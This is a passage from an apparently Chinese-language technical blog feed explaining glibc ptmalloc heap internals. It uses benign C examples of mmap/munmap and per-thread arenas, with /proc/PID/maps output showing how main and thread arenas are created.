class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Private anonymous mapping example using mmap syscall */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* msg)</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s failed. Exiting the process\n&quot;</span>, msg);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">int</span> ret = <span class="hljs-number">-1</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;</span>, getpid());<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before mmap\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-type">char</span>* addr = <span class="hljs-literal">NULL</span>;<br>        addr = mmap(<span class="hljs-literal">NULL</span>, (<span class="hljs-type">size_t</span>)<span class="hljs-number">132</span>*<span class="hljs-number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>                errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After mmap\n&quot;</span>);<br>        getchar();<br><br>        <span class="hljs-comment">/* Unmap mapped region. */</span><br>        ret = munmap(addr, (<span class="hljs-type">size_t</span>)<span class="hljs-number">132</span>*<span class="hljs-number">1024</span>);<br>        <span class="hljs-keyword">if</span>(ret == <span class="hljs-number">-1</span>)<br>                errExit(<span class="hljs-string">&quot;munmap&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After munmap\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>在执行 mmap 之前</strong></p><p>我们可以从下面的输出看到，目前只有. so 文件的 mmap 段。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="hljs-number">6067</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>在这b<span class="hljs-number">7e21000</span>-b<span class="hljs-number">7e22000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$<br></code></pre></td></tr></table></figure><p><strong>mmap 后</strong></p><p>从下面的输出可以看出，我们申请的内存与已经存在的内存段结合在了一起构成了 b7e00000 到 b7e21000 的 mmap 段。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="hljs-number">6067</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>在这b<span class="hljs-number">7e00000</span>-b<span class="hljs-number">7e22000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$<br></code></pre></td></tr></table></figure><p><strong>munmap</strong></p><p>从下面的输出，我们可以看到我们原来申请的内存段已经没有了，内存段又恢复了原来的样子了。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="hljs-number">6067</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap<br>在这b<span class="hljs-number">7e21000</span>-b<span class="hljs-number">7e22000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$<br></code></pre></td></tr></table></figure><h3 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h3><p>在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是<strong>支持了多线程的快速访问</strong>。在新的实现中，所有的线程共享<strong>多个堆</strong>。</p><p>这里给出一个例子。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Per thread arena example. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">threadFunc</span><span class="hljs-params">(<span class="hljs-type">void</span>* arg)</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before malloc in thread 1\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-type">char</span>* addr = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After malloc and before free in thread 1\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-built_in">free</span>(addr);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After free in thread 1\n&quot;</span>);<br>        getchar();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">pthread_t</span> t1;<br>        <span class="hljs-type">void</span>* s;<br>        <span class="hljs-type">int</span> ret;<br>        <span class="hljs-type">char</span>* addr;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before malloc in main thread\n&quot;</span>);<br>        getchar();<br>        addr = (<span class="hljs-type">char</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After malloc and before free in main thread\n&quot;</span>);<br>        getchar();<br>        <span class="hljs-built_in">free</span>(addr);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After free in main thread\n&quot;</span>);<br>        getchar();<br>        ret = pthread_create(&amp;t1, <span class="hljs-literal">NULL</span>, threadFunc, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">if</span>(ret)<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread creation error\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        ret = pthread_join(t1, &amp;s);<br>        <span class="hljs-keyword">if</span>(ret)<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thread join error\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>pthread_create</code> 是 POSIX 线程库中用于创建新线程的函数。它是 POSIX 线程（pthread）标准的一部分，该标准定义了在多线程程序中创建和管理线程的方法。<code>pthread_create</code> 函数允许程序并行地执行多个线程，从而提高程序的效率和响应能力。</p><p>函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_create</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> *thread, <span class="hljs-type">const</span> <span class="hljs-type">pthread_attr_t</span> *attr,<span class="hljs-type">void</span> *(*startroutine)(<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *arg)</span>;<br></code></pre></td></tr></table></figure><p>参数说明：</p><ol><li><code>pthread_t *thread</code>：这是一个指向 <code>pthread_t</code> 类型的指针，用于存储新创建线程的标识符。如果线程成功创建，这个变量将被赋予一个唯一的线程ID。</li><li><code>const pthread_attr_t *attr</code>：这是一个指向 <code>pthread_attr_t</code> 类型的指针，它指定了线程的属性。如果设置为 <code>NULL</code>，则使用默认的线程属性。</li><li><code>void *(*startroutine)(void *)</code>：这是新线程开始执行时调用的函数。它是一个函数指针，指向一个接受 <code>void*</code> 类型参数并返回 <code>void*</code> 类型值的函数。</li><li><code>void *arg</code>：这是传递给 <code>startroutine</code> 函数的参数。</li></ol><p>返回值：</p><ul><li><code>0</code>：表示线程成功创建。</li><li>非零值：表示创建线程失败，错误代码会说明具体的错误原因。</li></ul><p><strong>第一次申请之前</strong>， 没有任何任何堆段。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena exampl<span class="hljs-number">e::6501</span><br>Before malloc in main thread<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="hljs-number">6501</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>b<span class="hljs-number">7e05000</span>-b<span class="hljs-number">7e07000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>第一次申请后</strong>， 从下面的输出可以看出，堆段被建立了，并且它就紧邻着数据段，这说明 malloc 的背后是用 brk 函数来实现的。同时，需要注意的是，我们虽然只是申请了 1000 个字节，但是我们却得到了 0x0806c000-0x0804b000&#x3D;0x21000 个字节的堆。<strong>这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。</strong>我们称这一块连续的内存区域为 <strong>arena</strong>。此外，我们称由主线程申请的内存为 <strong>main_arena</strong>。后续的申请的内存会一直从这个 <strong>arena</strong> 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ruby">sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/ptmalloc</span>.ppt/mthread<span class="hljs-variable">$ </span>./mthread<br><span class="hljs-title class_">Welcome</span> to per thread arena example::<span class="hljs-number">6501</span><br><span class="hljs-title class_">Before</span> malloc <span class="hljs-keyword">in</span> main thread<br><span class="hljs-title class_">After</span> malloc <span class="hljs-keyword">and</span> before free <span class="hljs-keyword">in</span> main thread<br>...<br>sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/lsploits/hof/ptmalloc</span>.ppt/mthread<span class="hljs-variable">$ </span>cat /<span class="hljs-built_in">proc</span>/<span class="hljs-number">6501</span>/maps<br>08048000-08049000 r-xp <span class="hljs-number">00000000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>08049000-0804a000 r--p <span class="hljs-number">00000000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804a000-0804b000 rw-p <span class="hljs-number">00001000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804b000-0806c000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b7e05000-b7e07000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/ptmalloc</span>.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>在主线程释放内存后</strong>，我们从下面的输出可以看出，其对应的 arena 并没有进行回收，而是交由 glibc 来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ruby">sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/ptmalloc</span>.ppt/mthread<span class="hljs-variable">$ </span>./mthread<br><span class="hljs-title class_">Welcome</span> to per thread arena example::<span class="hljs-number">6501</span><br><span class="hljs-title class_">Before</span> malloc <span class="hljs-keyword">in</span> main thread<br><span class="hljs-title class_">After</span> malloc <span class="hljs-keyword">and</span> before free <span class="hljs-keyword">in</span> main thread<br><span class="hljs-title class_">After</span> free <span class="hljs-keyword">in</span> main thread<br>...<br>sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/lsploits/hof/ptmalloc</span>.ppt/mthread<span class="hljs-variable">$ </span>cat /<span class="hljs-built_in">proc</span>/<span class="hljs-number">6501</span>/maps<br>08048000-08049000 r-xp <span class="hljs-number">00000000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>08049000-0804a000 r--p <span class="hljs-number">00000000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804a000-0804b000 rw-p <span class="hljs-number">00001000</span> 08<span class="hljs-symbol">:</span><span class="hljs-number">01</span> <span class="hljs-number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br>0804b000-0806c000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b7e05000-b7e07000 rw-p <span class="hljs-number">00000000</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> <span class="hljs-number">0</span><br>...<br>sploitfun<span class="hljs-variable">@sploitfun</span>-<span class="hljs-title class_">VirtualBox</span><span class="hljs-symbol">:~/ptmalloc</span>.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>在第一个线程 malloc 之前</strong>，我们可以看到并没有出现与线程 1 相关的堆，但是出现了与线程 1 相关的栈。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena exampl<span class="hljs-number">e::6501</span><br>Before malloc in main thread<br>After malloc and before free in main thread<br>After free in main thread<br>Before malloc in thread <span class="hljs-number">1</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="hljs-number">6501</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804b000</span>-<span class="hljs-number">0806c000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b<span class="hljs-number">7604000</span>-b<span class="hljs-number">7605000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7605000</span>-b<span class="hljs-number">7e07000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [stack:<span class="hljs-number">6594</span>]<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>第一个线程 malloc 后</strong>， 我们可以从下面输出看出线程 1 的堆段被建立了。而且它所在的位置为内存映射段区域，同样大小也是 132KB(b7500000-b7521000)。因此这表明该线程申请的堆时，背后对应的函数为**mmap **函数。同时，我们可以看出实际真的分配给程序的内存为 1M(b7500000-b7600000)。而且，只有 132KB 的部分具有可读可写权限，这一块连续的区域成为 <strong>thread arena。</strong></p><p>注意：</p><blockquote><p><strong>当用户请求的内存大于 128KB 时，并且没有任何 arena 有足够的空间时</strong>，那么系统就会执行 mmap 函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</p></blockquote><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena exampl<span class="hljs-number">e::6501</span><br>Before malloc in main thread<br>After malloc and before free in main thread<br>After free in main thread<br>Before malloc in thread <span class="hljs-number">1</span><br>After malloc and before free in thread <span class="hljs-number">1</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="hljs-number">6501</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804b000</span>-<span class="hljs-number">0806c000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b<span class="hljs-number">7500000</span>-b<span class="hljs-number">7521000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7521000</span>-b<span class="hljs-number">7600000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7604000</span>-b<span class="hljs-number">7605000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7605000</span>-b<span class="hljs-number">7e07000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [stack:<span class="hljs-number">6594</span>]<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure><p><strong>在第一个线程释放内存后</strong>， 我们可以从下面的输出看到，这样释放内存同样<strong>不会</strong>把内存重新给系统。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dns">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread<br>Welcome to per thread arena exampl<span class="hljs-number">e::6501</span><br>Before malloc in main thread<br>After malloc and before free in main thread<br>After free in main thread<br>Before malloc in thread <span class="hljs-number">1</span><br>After malloc and before free in thread <span class="hljs-number">1</span><br>After free in thread <span class="hljs-number">1</span><br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="hljs-number">6501</span>/maps<br><span class="hljs-number">08048000</span>-<span class="hljs-number">08049000</span> r-xp <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">08049000</span>-<span class="hljs-number">0804a000</span> r--p <span class="hljs-number">00000000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804a000</span>-<span class="hljs-number">0804b000</span> rw-p <span class="hljs-number">00001000 08</span>:<span class="hljs-number">01 539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread<br><span class="hljs-number">0804b000</span>-<span class="hljs-number">0806c000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [heap]<br>b<span class="hljs-number">7500000</span>-b<span class="hljs-number">7521000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7521000</span>-b<span class="hljs-number">7600000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7604000</span>-b<span class="hljs-number">7605000</span> ---p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span><br>b<span class="hljs-number">7605000</span>-b<span class="hljs-number">7e07000</span> rw-p <span class="hljs-number">00000000 00</span>:<span class="hljs-number">00</span> <span class="hljs-number">0</span>          [stack:<span class="hljs-number">6594</span>]<br>...<br>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>2025冬令营</category>
      
      <category>堆</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>shellcode</title>
    <link href="/2025/01/26/shellcode/"/>
    <url>/2025/01/26/shellcode/</url>
    
